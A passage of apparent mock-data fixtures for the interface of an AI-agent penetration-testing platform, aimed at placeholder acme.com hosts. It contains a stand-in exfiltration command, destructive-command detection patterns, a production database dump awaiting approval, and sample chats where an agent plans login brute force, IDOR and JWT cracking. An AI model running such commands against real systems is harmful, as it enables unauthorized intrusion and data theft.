  ["x-13", "shop.acme.com", "POST", "https://shop.acme.com/pay", 200, "application/json", 128],
  ["x-14", "www.acme.com", "GET", "https://www.acme.com/robots.txt", 200, "text/plain", 88],
] as const;

export const traffic: TrafficResp = {
  enabled: true,
  proxy: ":8788",
  count: exchanges.length,
  total: exchanges.length,
  page: 0,
  size: 100,
  exchanges: exchanges.map(([id, host, method, url, status, ct, len], i) => ({
    id, host, method, url, status, content_type: ct, resp_len: len,
    ts: T(`2026-07-26T0${1 + (i % 3)}:${String(10 + i).padStart(2, "0")}:00Z`),
  })),
};

export const trafficDetail: TrafficDetail = {
  req: `GET /v1/orders?id=1002 HTTP/1.1
Host: api.acme.com
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
User-Agent: AntiFox-worker/1.0
Accept: application/json

`,
  resp: `HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 655

{
  "order_id": 1002,
  "user_id": 77,
  "amount": 1299.00,
  "address": "Chaoyang District, Beijing ****",
  "phone": "138****6021",
  "items": [{ "sku": "A-100", "qty": 1 }]
}`,
};

// ── Security / Audit ─────────────────────────────────────────────────────────
export const audit: Audit = {
  attributions: { allow: 214, block: 6 },
  entries: [
    { ts: T("2026-07-26T03:33:00Z"), tool: "bash", action: "allow", command: "curl -s -d 'username=admin...' https://admin.acme.com/login" },
    { ts: T("2026-07-26T03:57:00Z"), tool: "bash", action: "allow", command: "curl -s -b 'session=...' https://admin.acme.com/api/users" },
    { ts: T("2026-07-26T02:10:00Z"), tool: "bash", action: "block", reason: "Target out of scope: out.evil.example is not inside the scope", command: "curl https://out.evil.example/exfil" },
    { ts: T("2026-07-25T22:03:00Z"), tool: "bash", action: "allow", command: "sqlmap -u 'https://www.acme.com/search?q=1' --batch" },
    { ts: T("2026-07-25T21:00:00Z"), tool: "bash", action: "block", reason: "Destructive command gate: rm -rf was rejected", command: "rm -rf /var/www" },
    { ts: T("2026-07-25T20:30:00Z"), tool: "bash", action: "allow", command: "git-dumper https://www.acme.com/.git/ /tmp/acme" },
  ],
};

// ── LLM profiles ─────────────────────────────────────────────────────────────
export const llmProfiles: LLMProfile[] = [
  { id: "1", name: "Claude Opus 4.8", format: "anthropic", model: "claude-opus-4-8", api_key_hint: "…a3f2", rate_per_second: 0, rate_per_minute: 0, context_window_k: 1000, reasoning_effort: "high", is_default: true },
  { id: "2", name: "DeepSeek V4", format: "openai", base_url: "https://api.deepseek.com/v1", model: "deepseek-v4-flash", api_key_hint: "…9c11", rate_per_second: 0, rate_per_minute: 60, context_window_k: 128, reasoning_effort: "", is_default: false },
];

export const llmConfig = {
  configured: true, provider: "anthropic", model: "claude-opus-4-8",
  base_url: "", proxy: "", key_set: true,
  rate_per_second: 0, rate_per_minute: 0, context_window_k: 1000, reasoning_effort: "high",
};

// ── Agents ───────────────────────────────────────────────────────────────────
export const agents: Agent[] = [
  { id: "1", key: "goals", name: "Goal Decomposer", role: "goals", builtin: true, enabled: true, description: "Splits the task goal into explorable sub-goals", max_turns: 8, mcp_count: 0, skill_count: 1, tool_count: 3 },
  { id: "2", key: "planner", name: "Planner", role: "planner", builtin: true, enabled: true, description: "Reads the exploration route, judges whether goals are met, and generates intents", max_turns: 0, mcp_count: 1, skill_count: 2, tool_count: 9 },
  { id: "3", key: "mainagent", name: "Main Agent", role: "mainagent", builtin: true, enabled: true, description: "Human-in-the-loop conversation; injects hints and high-priority intents", max_turns: 0, web_search: true, mcp_count: 2, skill_count: 3, tool_count: 11 },
  { id: "4", key: "worker", name: "Work Agent", role: "worker", builtin: true, enabled: true, description: "claim an intent -> run Kali tools -> write back to the graph", max_turns: 40, run_seconds: 1800, web_search: false, interactive_shell: true, mcp_count: 2, skill_count: 3, tool_count: 14 },
  { id: "5", key: "recon-bot", name: "Recon Bot (custom)", role: "custom", builtin: false, enabled: true, description: "Runs passive reconnaissance against new assets on a schedule", max_turns: 12, mcp_count: 1, skill_count: 1, tool_count: 4 },
];

const promptVars: PromptVar[] = [
  { name: "Goal", description: "Current task goal", example: "Obtain admin access to acme.com", source: "runtime" },
  { name: "AssetSummary", description: "Overview of the asset graph", example: "6 subdomains / 3 IPs / 4 apps / 4 endpoints", source: "distilled" },
  { name: "RouteHint", description: "Exploration route hint", example: "Prioritize the admin backend and the API authorization-bypass surface", source: "exploration" },
];

const promptVersions: PromptVersion[] = [
  { version: 3, ts: T("2026-07-25T10:00:00Z"), note: "Stronger guidance for authorization-bypass probing", template_text: "You are the planner of AntiFox..." },
  { version: 2, ts: T("2026-07-20T10:00:00Z"), note: "Initial fine-tuning", template_text: "You are the planner of AntiFox (v2)..." },
];

export function agentDetail(key: string): AgentDetail {
  const a = agents.find((x) => x.key === key) ?? agents[1];
  return {
    agent: a,
    prompt: `You are the "${a.name}" of AntiFox.\nGoal: {{.Goal}}\nAsset overview: {{.AssetSummary}}\nRoute hint: {{.RouteHint}}\nAdvance the exploration based on the information above and write the results back to the graph through the tools.`,
    variables: promptVars,
    versions: promptVersions,
    visibility: { mcp: [1, 2], skill: ["api-recon", "playwright-cli"] },
    wrapup_prompt: "",
    wrapup_default: "The time or step budget is nearly exhausted; summarize the confirmed findings and mark the intents as terminal.",
    wrapup_max_turns: 0,
    wrapup_max_turns_default: 3,
    task_timeout_wrapup_supported: a.key === "worker" || a.key === "planner",
    task_timeout_wrapup_default: "The task timed out; wrap up immediately and persist the current conclusions.",
    task_timeout_wrapup_max_turns_default: 2,
  };
}

// ── MCP ──────────────────────────────────────────────────────────────────────
export const mcpServers: MCPServer[] = [
  { id: 1, name: "shodan", transport: "http", url: "https://mcp.shodan.io/sse", args: [], env: {}, enabled: true, tools: ["host_info", "search", "dns_resolve"] },
  { id: 2, name: "playwright", transport: "stdio", command: "npx", args: ["-y", "@playwright/mcp"], env: {}, enabled: true, tools: ["browser_navigate", "browser_click", "browser_snapshot"] },
];

export const mcpToolsById: Record<number, MCPTool[]> = {
  1: [
    { name: "host_info", description: "Query Shodan host information for an IP" },
    { name: "search", description: "Shodan search" },
    { name: "dns_resolve", description: "DNS resolution" },
  ],
  2: [
    { name: "browser_navigate", description: "Open a URL in the browser" },
    { name: "browser_click", description: "Click an element" },
    { name: "browser_snapshot", description: "Capture an accessibility snapshot" },
  ],
};

// ── Skills ───────────────────────────────────────────────────────────────────
export const skills: SkillItem[] = [
  { name: "api-recon", description: "Reconnaissance and authorization-bypass surface enumeration for REST/GraphQL APIs; use it when new API endpoints are discovered.", license: "MIT", mcps: [], files: ["SKILL.md", "scripts/enum.py"] },
  { name: "playwright-cli", description: "Drives a browser with Playwright for dynamic crawling and screenshots; use it for sites that require JavaScript rendering.", mcps: ["playwright"], files: ["SKILL.md"] },
  { name: "scopesentry", description: "Pulls assets from ScopeSentry and merges them into the company scope; use it when bulk-importing assets.", files: ["SKILL.md", "assets/mapping.md"] },
];

// ── Tools ────────────────────────────────────────────────────────────────────
export const tools: Tool[] = [
  { key: "bash", system: true, description: "Runs a shell command in the Kali environment (gated by scope and destructive-command rules)", schema: { type: "object", properties: { command: { type: "string" } }, required: ["command"] }, agents: ["worker", "mainagent"], enabled: true, kind: "builtin" },
  { key: "report_finding", system: true, description: "Reports a security finding and links it to the relevant node", schema: { type: "object", properties: { vulnclass: { type: "string" }, severity: { type: "string" }, summary: { type: "string" }, evidence: { type: "string" } }, required: ["vulnclass", "severity", "summary"] }, agents: ["worker"], enabled: true, kind: "builtin" },
  { key: "upsert_asset", system: true, description: "Writes or updates an asset node", schema: { type: "object", properties: { type: { type: "string" }, value: { type: "string" } } }, agents: ["worker"], enabled: true, kind: "builtin" },
  { key: "list_goals", system: true, description: "Lists the goals of the current task and their status", schema: { type: "object", properties: {} }, agents: ["planner"], enabled: true, kind: "builtin" },
  { key: "nuclei_scan", system: false, description: "Custom: run a specific template with nuclei", schema: { type: "object", properties: { target: { type: "string" }, template: { type: "string" } }, required: ["target"] }, agents: ["worker"], enabled: true, kind: "command", exec: { command: "nuclei", args: ["-u", "{{target}}"] } },
];

// ── Settings ─────────────────────────────────────────────────────────────────
export const settings: Settings = {
  traffic_capture: true,
  web_search_enabled: true,
  web_search_backend: "ddgs",
  brave_key_set: false,
  tavily_key_set: true,
  web_search_proxy: "",
  python_interpreter: "/usr/bin/python3",
  workers: 3,
};

// ── Intercept ────────────────────────────────────────────────────────────────
export const interceptRules: InterceptRule[] = [
  { id: 1, name: "Destructive commands require approval", enabled: true, priority: 10, match_target: "tool_input", match_type: "regex", pattern: "rm\\s+-rf|mkfs|dd\\s+if=", action: "ask", message: "Destructive command detected; manual approval required", timeout_enabled: true, timeout_seconds: 120, timeout_action: "deny", created_at: T("2026-07-20T10:00:00Z"), updated_at: T("2026-07-20T10:00:00Z") },
  { id: 2, name: "Deny outbound traffic directly", enabled: true, priority: 20, match_target: "tool_input", match_type: "string", pattern: "exfil", action: "deny", message: "Suspected data exfiltration", timeout_enabled: false, timeout_seconds: 0, timeout_action: "deny", created_at: T("2026-07-21T10:00:00Z"), updated_at: T("2026-07-21T10:00:00Z") },
];

export const interceptPending: InterceptPending[] = [
  { id: 101, rule_id: 1, task_id: "t-acme-web", agent_name: "work#3", tool_name: "bash", tool_input: { command: "mysqldump -h 203.0.113.10 -uroot acme_prod > /tmp/dump.sql" }, status: "pending", created_at: T("2026-07-26T03:58:00Z") },
];

export const interceptHistory: InterceptApprovalRow[] = [
  { id: 90, rule_id: 1, task_id: "t-acme-web", agent_name: "work#1", tool_name: "bash", tool_input: { command: "dd if=/dev/zero of=/tmp/x" }, status: "denied", created_at: T("2026-07-25T20:00:00Z"), decided_at: T("2026-07-25T20:01:00Z"), conv_title: "", conv_agent_key: "", rule_name: "Destructive commands require approval" },
  { id: 91, task_id: "t-acme-api", agent_name: "work#2", tool_name: "bash", tool_input: { command: "nmap -sV 203.0.113.11" }, status: "allowed", created_at: T("2026-07-25T18:00:00Z"), decided_at: T("2026-07-25T18:00:05Z"), conv_title: "", conv_agent_key: "", rule_name: "" },
];

// ── Conversations (chat) ─────────────────────────────────────────────────────
export const conversations: Conversation[] = [
  { id: 1, agent_key: "mainagent", title: "Discussion of the acme admin backend entry point", llm_profile_id: 1, created_at: T("2026-07-25T10:00:00Z"), updated_at: T("2026-07-26T03:40:00Z") },
  { id: 2, agent_key: "mainagent", title: "Mapping the API authorization-bypass surface", llm_profile_id: 2, created_at: T("2026-07-24T16:00:00Z"), updated_at: T("2026-07-24T17:20:00Z") },
];

export const conversationMessages: Record<number, Activity[]> = {
  1: [
    { seq: 1, worker: "user", ts: T("2026-07-25T10:00:00Z"), kind: "user", summary: "Where is the admin backend, and where do we start?" },
    { seq: 2, worker: "mainagent", ts: T("2026-07-25T10:00:04Z"), kind: "thinking", summary: "First confirm the technology stack and protections on the admin.acme.com login page (CAPTCHA / rate limiting), then decide between default credentials and a dictionary." },
    { seq: 3, worker: "mainagent", ts: T("2026-07-25T10:00:06Z"), kind: "tool_use", tool: "bash", tool_use_id: "c11", summary: "curl -s https://admin.acme.com/login | grep -Eo 'element-ui|captcha|csrf'" },
    { seq: 4, worker: "mainagent", ts: T("2026-07-25T10:00:08Z"), kind: "tool_result", tool: "bash", tool_use_id: "c11", summary: "element-ui\ncsrf", detail: "Element-UI admin backend with a CSRF token but no CAPTCHA." },
    { seq: 5, worker: "mainagent", ts: T("2026-07-25T10:00:20Z"), kind: "tool_use", tool: "bash", tool_use_id: "c12", summary: "for i in 1 2 3 4 5; do curl -s -o /dev/null -w '%{http_code}\\n' -d 'username=x&password=y' https://admin.acme.com/login; done" },
    { seq: 6, worker: "mainagent", ts: T("2026-07-25T10:00:24Z"), kind: "tool_result", tool: "bash", tool_use_id: "c12", summary: "401\\n401\\n401\\n401\\n401", detail: "Five consecutive attempts with no lockout and no CAPTCHA -> no rate limiting, so brute force is possible." },
    { seq: 7, worker: "mainagent", ts: T("2026-07-25T10:00:30Z"), kind: "text", summary: "Conclusion: an Element-UI admin backend with no CAPTCHA and no rate limiting. Order of attack: (1) run the default credential list first (admin/admin, admin/admin123, admin/123456), (2) if that fails, move on to the top-1000 dictionary. I have injected 'admin backend default credential testing' as a high-priority intent for the work agent." },
    { seq: 8, worker: "user", ts: T("2026-07-26T03:40:00Z"), kind: "user", summary: "Did it work?" },
    { seq: 9, worker: "mainagent", ts: T("2026-07-26T03:40:05Z"), kind: "text", summary: "It worked - admin/admin123 logged straight into the console. It has been recorded as a high-severity finding and proves the 'obtain admin access' goal. Next we move on to reading user data (goal 2)." },
  ],
  2: [
    { seq: 1, worker: "user", ts: T("2026-07-24T16:00:00Z"), kind: "user", summary: "Help me map the authorization-bypass surface of api.acme.com." },
    { seq: 2, worker: "mainagent", ts: T("2026-07-24T16:00:05Z"), kind: "thinking", summary: "First understand how the API authenticates and how a few key endpoints behave, then judge the IDOR / JWT risk." },
    { seq: 3, worker: "mainagent", ts: T("2026-07-24T16:00:10Z"), kind: "tool_use", tool: "bash", tool_use_id: "c21", summary: "curl -s https://api.acme.com/v1/users/me -H 'Authorization: Bearer <self>' | jq '{id,role}'" },
    { seq: 4, worker: "mainagent", ts: T("2026-07-24T16:00:12Z"), kind: "tool_result", tool: "bash", tool_use_id: "c21", summary: "{ \"id\": 42, \"role\": \"user\" }", detail: "The regular-user token works." },
    { seq: 5, worker: "mainagent", ts: T("2026-07-24T16:00:30Z"), kind: "tool_use", tool: "bash", tool_use_id: "c22", summary: "echo '<jwt>' | cut -d. -f1 | base64 -d; # inspect the algorithm" },
    { seq: 6, worker: "mainagent", ts: T("2026-07-24T16:00:31Z"), kind: "tool_result", tool: "bash", tool_use_id: "c22", summary: "{\"alg\":\"HS256\",\"typ\":\"JWT\"}", detail: "HS256 is a symmetric signature, so a weak key can be brute-forced offline to forge tokens." },
    { seq: 7, worker: "mainagent", ts: T("2026-07-24T16:01:00Z"), kind: "text", summary: "There are two authorization-bypass routes: (1) /v1/orders?id= uses an auto-incrementing numeric id, a classic IDOR - change the id and try to read another user's order; (2) the JWT uses HS256, so try john/hashcat to crack the key and forge any sub claim for privilege escalation. I have derived one intent for each. I suggest starting with the IDOR (low cost, direct impact)." },
  ],
};
